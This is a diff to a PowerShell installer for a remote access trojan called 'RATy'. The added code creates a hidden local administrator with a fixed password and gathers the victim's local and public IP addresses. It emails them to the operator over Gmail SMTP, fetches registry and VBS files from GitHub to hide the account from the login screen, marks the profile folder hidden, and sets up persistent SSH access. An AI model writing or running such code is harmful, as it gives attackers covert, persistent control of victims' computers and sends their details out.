@@ -11,8 +11,8 @@ function random_text {
 ###
 
 ######################################################################################
-# Function to Craetes Local Admin for RATy
-function craete_account {
+# Function to Create Local Admin for RATy
+function create_account {
     [CmdletBinding()]
 
     param (
@@ -24,7 +24,7 @@ function craete_account {
     }
     
     process {
-        New-LocalUser "$uname" -pword $pword -FullName "$uname" -Desciption "Temporary local admin"
+        New-LocalUser -Name "$uname" -Password $pword -FullName "$uname" -Description "Temporary local admin"
         Write-Verbose "$uname local user craeted" 
         Add-LocalGroupMember -Group "Administrators" -Member "$uname"
         Write-Verbose "$uname added to the local administrator group"
@@ -35,22 +35,79 @@ function craete_account {
 }
 
 #Creates Admin User
-$uname = "WinGuest"    # Username for the newly created LocalAdmin
-$pword = (ConvertTo-SecureString "admin" -AsPlainText -Force)   # Password for the Newly Created LocalAdmin
-craete_account -uname $uname -pword $pword   # Creates LocalAdmin on getters end
+Remove-LocalUser -Name "onlyrat"  # Remove the user in case it already exists
+$uname = "WinGuest"  # Username for the newly created LocalAdmin
+$pword = (ConvertTo-SecureString "RATy" -AsPlainText -Force)  # Password for the Newly Created LocalAdmin
+create_account -uname $uname -pword $pword   # Creates LocalAdmin on getters end
 ######################################################################################
 
 
 #  VARIABLES
 # FOR Working Directory names, inside Temp Directory of Windows
 $wd = random_text    # creates and store a string of random characters inside $wd (working directory) which can be later given to a file as "name"
-$path = "$env:temp/$wd"    # path of the folder in temp directory in which we will store our RAT related files
+$workingDirectoryInTemp = "$env:temp/$wd"    # path of the folder in temp directory in which we will store our RAT related files
 $initial_dir = Get-Location    # for storing the current directory we are in OR where the 'installer.ps1' file is placed, will be used for self deleting 'installer.ps1' file in the end - 'Get-Location' in .ps1 == '%cd%' in .cmd
-echo $path
+echo $workingDirectoryInTemp
+$configFile = Join-Path (Get-Location) "$env:UserName.rat"
+$wd = Get-Location
+$LocalEthernetIP = (Get-NetIPAddress -AddressFamily IPV4 -InterfaceAlias Ethernet).IPAddress
+$LocalWifiIP = (Get-NetIPAddress -AddressFamily IPV4 -InterfaceAlias Wi-fi).IPAddress
+$GlobalPublicIP = (Invoke-RestMethod -Uri "https://ipinfo.io/ip").Trim()
+
+Add-Content -Path $configFile -Value $LocalWifiIP   # If the getter PC is using internet via Wifi, use this for ssh
+Add-Content -Path $configFile -Value "RATy"  # Adding Password of the new admin we created
+Add-Content -Path $configFile -Value $workingDirectoryInTemp  # directory in TEMP which we created(store RATy file)
+Add-Content -Path $configFile -Value $LocalEthernetIP  # If the getter is accessing Internet via Ethernet, use this
+Add-Content -Path $configFile -Value $GlobalPublicIP
+
+# SENDING Getter Details (Configurations) to Sender via SMTP/eMail
+##########################################################################
+# Define SMTP server and port (Gmail SMTP example)
+$smtpServer = "smtp.gmail.com"
+$smtpPort = 587
+
+# PUT sender and recipient details
+$senderEmail = "yourAddress@gmail.com"
+$recipientEmail = "yourAddress@gmail.com"
+$subject = " {New} Test Email from $env:UserName"
+$body = "This is a test email sent from ps1 using mail SMTP."
+
+# PUT the App Password (generated after enabling 2FA)
+$appPassword = "16-Digit-App-Password"  # Use the app-specific password
+
+# Create the SMTP client
+$mailmessage = New-Object system.net.mail.mailmessage
+$mailmessage.from = ($senderEmail)
+$mailmessage.To.add($recipientEmail)
+$mailmessage.Subject = $subject
+$mailmessage.Body = $body
+
+
+# Create the attachment object and add it to the email
+$attachment = New-Object System.Net.Mail.Attachment($configFile)
+$mailmessage.Attachments.Add($attachment)
+
+# Configure the SMTP client and authenticate using the App Password
+$smtp = New-Object Net.Mail.SmtpClient($smtpServer, $smtpPort)
+$smtp.EnableSsl = $true
+$smtp.Credentials = New-Object System.Net.NetworkCredential($senderEmail, $appPassword)
+
+# Send the email
+$smtp.Send($mailmessage)
+
+Write-Host "Email sent successfully!"
+
+# Disposing the attachment object in order to release the file/proccess lock - otherwise we couldnt be able to delete the file
+$attachment.Dispose()
+######################################################################
+
+Start-Sleep -Milliseconds 500
+Remove-Item $configFile -Force  # Remove the file containing Configuration
+
 
 # GOTO TEMP Directory and do the Magic
-mkdir $path   # creates a folder inside temp directory with the name stored in the $wd variable (name will be a string of random characters)
-cd $path    # moves to our own created folder inside temp directory of windows
+mkdir $workingDirectoryInTemp   # creates a folder inside temp directory with the name stored in the $wd variable (name will be a string of random characters)
+cd $workingDirectoryInTemp    # moves to our own created folder inside temp directory of windows
 
 
 # Invoke Persistent SSH
@@ -80,16 +137,20 @@ if (-not $sshRule) {
 
 
 # Getting Registry file (that will make some changes in WIN Reg to make sure that the newly created user doesnt show on Login Screen when the user starts his PC) and Code to run it automatically (Confirming the changes in registry)
-powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -URI '' -OutFile '' "
-powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -URI '' -OutFile '' "
+powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -URI 'https://raw.githubusercontent.com/mohid-mughal/RATy/refs/heads/main/files/ServiceModelWinRegConfig.reg' -OutFile 'ServiceModelWinRegConfig.reg' "
+powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -URI 'https://raw.githubusercontent.com/mohid-mughal/RATy/refs/heads/main/files/confirm.vbs' -OutFile 'confirm.vbs' "
 
 
 # Install/Run the Registry && conformation code HERE
-
+./ServiceModelWinRegConfig.reg ./confirm
 
 # if in future i need to create and put any file in the created (random named) folder inside the temp directory, the code for creating that particular file will go here
 ###
 
+# A humble try to hide the Newly Created Use (WinGuest) from the 
+cd $env:USERPROFILE
+ cd..
+ attrib +h +s +r WinGuest   # Marks the file as Hidden, System & Read Only File 
 
 #Same as PAUSE command in .cmd
 Read-Host "Wanna delete 'installer.ps1'? Press any key to continue"
